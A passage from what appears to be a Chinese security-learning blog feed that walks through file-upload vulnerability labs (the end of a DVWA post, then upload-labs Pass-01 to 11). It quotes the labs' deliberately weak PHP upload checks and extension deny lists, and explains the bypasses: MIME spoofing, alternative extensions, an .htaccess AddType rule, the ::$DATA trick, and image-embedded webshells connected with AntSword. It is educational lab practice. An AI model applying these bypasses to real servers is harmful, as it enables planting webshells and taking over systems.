alt="Augenstern" loading="lazy"><br>将后缀改成jpg。然后上传，（其实挺意外的竟然传过去了，连burp都没用到，有点不对劲啊。）<br><img src="https://img-blog.csdnimg.cn/20200409134307723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>查看是打不开的<br><img src="https://img-blog.csdnimg.cn/20200409134428491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>连接也是失败的。<br><img src="https://img-blog.csdnimg.cn/20200409134754408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>接下来不会了，搞不明白什么情况了。<br>看了大佬的文章进行学习，因为视频资源有点老了，DVWA已经更新了，前两个等级还好，还能用，高级的就不好用了。所以果断百度大佬的文章继续进行接下来的学习。</p><h4 id="第二次错误尝试（图片马）"><a href="#第二次错误尝试（图片马）" class="headerlink" title="第二次错误尝试（图片马）"></a>第二次错误尝试（图片马）</h4><p>将一句话木马与一张图片进行合成。<br><img src="https://img-blog.csdnimg.cn/20200409141738384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>合成之后<br><img src="https://img-blog.csdnimg.cn/20200409141757565.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开看下，发现被合成到最后面了。<br><img src="https://img-blog.csdnimg.cn/20200409141942516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>上传一下，试试。<br><img src="https://img-blog.csdnimg.cn/20200409142234818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>又成功了，莫名的有点慌，这次应该能看吧。<br><img src="https://img-blog.csdnimg.cn/20200409142411949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看，那就复制URL进蚁剑尝试连接。<br><img src="https://img-blog.csdnimg.cn/20200409142630778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>？？？？？<br><img src="https://img-blog.csdnimg.cn/20200409143008943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>卡到这里了，完蛋，关于DVWA的high高级上传希望各位看到的师傅们指点我一下，万分感谢。<br><img src="https://img-blog.csdnimg.cn/20200417154456552.png" alt="Augenstern" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞——upload-labs靶场学习</title>
      <link href="/2020/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94upload-labs%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85%E5%92%8C%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%9517%E5%85%B3/"/>
      <url>/2020/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94upload-labs%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85%E5%92%8C%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%9517%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>前言：之前在DVWA靶场上了解了upload文件上传漏洞，并进行了学习，现在来安装upload-labs来打一下靶场。</p><h1 id="搭建靶场"><a href="#搭建靶场" class="headerlink" title="搭建靶场"></a>搭建靶场</h1><p>phpstudy集成环境。<br>upload-labs项目地址<a href="https://github.com/c0ny1/upload-labs">upload-labs</a>，下载压缩包解压到本地phpstudy的www文件夹下，将文件夹命名为<code>upload-labs</code>(个人选择)，也可以不改。<br>打开phpstudy，开启环境在浏览器中访问<code>127.0.0.1/upload-labs</code>就可以进入靶场。<br><img src="https://img-blog.csdnimg.cn/20200426124534142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h1 id="开始闯关"><a href="#开始闯关" class="headerlink" title="开始闯关"></a>开始闯关</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>第一步查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出可以传入的是<code>.jpg/.png/,gif</code>类型的图片。因为第一关嘛，限制比较简单，有以下几种方法。<br>1.禁用js<br>谷歌浏览器禁用js，可以百度搜索，不再多说。<br>火狐浏览器推荐一个插件<code>noscript</code>，禁用js后就可以上传php文件了。<br>2.burp抓包修改后缀，<br>先将要上传的<code>shell.php</code>后缀改成图片格式，比如jpg。<br>然后上传，抓包，修改回<code>shell.php</code>放包。上传成功。<br>3.直接传图片马</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是对Content-type的MIME类型进行限制。<br>在DVWA中尝试过了已经，<br>抓包，对Content-type进行修改，改为<code>image/jpeg</code>或者其他两种类型。不再赘述。</p><h2 id="Pass-03黑名单验证"><a href="#Pass-03黑名单验证" class="headerlink" title="Pass-03黑名单验证"></a>Pass-03黑名单验证</h2><h3 id="普通方法"><a href="#普通方法" class="headerlink" title="普通方法"></a>普通方法</h3><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个原本不知道该怎么操作，看了大佬的博客才知道了这个是黑名单过滤，服务器把后缀为<code>.asp .aspx .php .,jps</code> 的文件给过滤了，要想办法绕过这些。可以上传其他任意后缀。比如说:.phtml .phps .php5 .pht，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，前提条件是Apache的httpd.conf有如下配置代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php5 .pht .phps</span><br></pre></td></tr></table></figure><p>让Apache能够解析这些后缀的文件。<br>配置路径<br><code>D:\phpStudy\PHPTutorial\Apache\conf</code>我的是phpstudy集成环境，所以在phpstudy目录下。找到(httpd.conf)这个文件打开<br><img src="https://img-blog.csdnimg.cn/20200426132330859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>修改成图中的样子。<br>这个时候就可以将后缀改为<code>.phtml</code>再次上传<br>上传成功<br><img src="https://img-blog.csdnimg.cn/20200426141548939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>用蚁剑连接一下,连接失败。emmm挺烦的这个，好长时间了，还卡在这里，暂时，方法没错，可是我连接本地的就是连不上，无语啦。</p><h3 id="使用burpsuite爆破黑名单"><a href="#使用burpsuite爆破黑名单" class="headerlink" title="使用burpsuite爆破黑名单"></a>使用burpsuite爆破黑名单</h3><p>了解到一种方法，可能比较少见，现在分享一下<br>不改名，直接上传php文件<br><img src="https://img-blog.csdnimg.cn/20200509224024679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>开代理抓包，然后<code>Send to intruder</code><br><img src="https://img-blog.csdnimg.cn/2020050922414186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>进行php扩展名的爆破<br><img src="https://img-blog.csdnimg.cn/20200509224249905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>选择字典，或者自己添加参数。<br><img src="https://img-blog.csdnimg.cn/20200509224434638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>随便写几个吧，栗子而已。<br>然后就可以开始爆破了。<br><img src="https://img-blog.csdnimg.cn/20200509224620148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>上面的是可以上传的，下面的则是不符合条件的。<br>所以就知道应该传入什么文件了。(可能想的是，这也没有什么啊，还不如直接上传phtml方便。继续看)<br>然后右键单击一个，找到<code>Show response in browser</code><br><img src="https://img-blog.csdnimg.cn/20200509224829441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>点击copy，然后粘贴到浏览器<br><img src="https://img-blog.csdnimg.cn/20200509225054720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>记住关代理，暂停抓包，复制到浏览器跑一下<br><img src="https://img-blog.csdnimg.cn/2020050922522639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>会发现已经上传成功了，那其他的呢，也可以都试试。<br>我全部上传，最后看效果。<br>上传完成了，可以打开upload文件查看<br><img src="https://img-blog.csdnimg.cn/2020050922561114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>害，，还是连接不成功，不知道是哪里出的问题，已经困扰我好久了。太难了我。<br>没解决，访问直接下载phtml文件。无语啦=_=</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>这一关，传phtml文件不行了，也被加入了黑名单，所以先查看下源码，<br>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好多被限制的额，但是没有限制<code>.htaccess</code>文件。然后就可以上传这个文件。<br>这之前，需要进行一些改动，在apache解析那个文件中，检查mod_write模块是否开启，还有<code>AllowOverride All</code><br>先上传一个<code>1.htaccess</code>文件，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x<span class="literal">-httpd</span><span class="literal">-php</span> .jpg</span><br></pre></td></tr></table></figure><p>然后上传shell.jpg就可以尝试用蚁剑菜刀等工具连接了。<br>伤心事一笔带过。=_=</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>这个再上传htaccess文件已经不可以了，也被过滤了，所以看看源码。<br><img src="https://img-blog.csdnimg.cn/202005111627009.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>莫明的想笑，我的第五关跟别人的不一样，直接基础的过滤都给省略了，（大小写绕过，点绕过，空格绕过）<br>这里直接综合使用：<br>先将php文件上传抓包，<br><img src="https://img-blog.csdnimg.cn/20200511163223684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>它要过滤，那就制造给它过滤，让它先过滤空格和点，最后还剩下点，依旧能上传，尝试连接。<br><img src="https://img-blog.csdnimg.cn/20200511163503549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>OK，阔以。</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>呃呃呃，我发现这个是大小写过滤，，，怎么到后面来了，<br>这个就是将<code>shell.php</code>上传抓包改后缀为<code>Php</code>就可以绕过了。</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>空格绕过，这个在<code>shell.php</code>后加个空格就OK了，<br>抓包改成<code>shell.php </code>上传。</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>点过滤，抓包，修改后缀为<code>shell.php.</code>，即可进行点过滤。</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><code>::$DATA</code>绕过,</p><blockquote><p><code>在php+windows的情况下：如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过</code></p></blockquote><p>这是网上的大佬给的解释，简单明了。容易理解。<br>还是抓包修改<br><img src="https://img-blog.csdnimg.cn/20200511170305633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>测试连接，看到连接成功了。<br><img src="https://img-blog.csdnimg.cn/20200511170350369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>eeee,第十关好像跟第五关一样了，？？？<br><img src="https://img-blog.csdnimg.cn/20200511170652283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>仔细对比了一下，源码都一样的，=_=，直接过了哈。</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>查看源码可以看出,这里使用了替换函数。<br><img 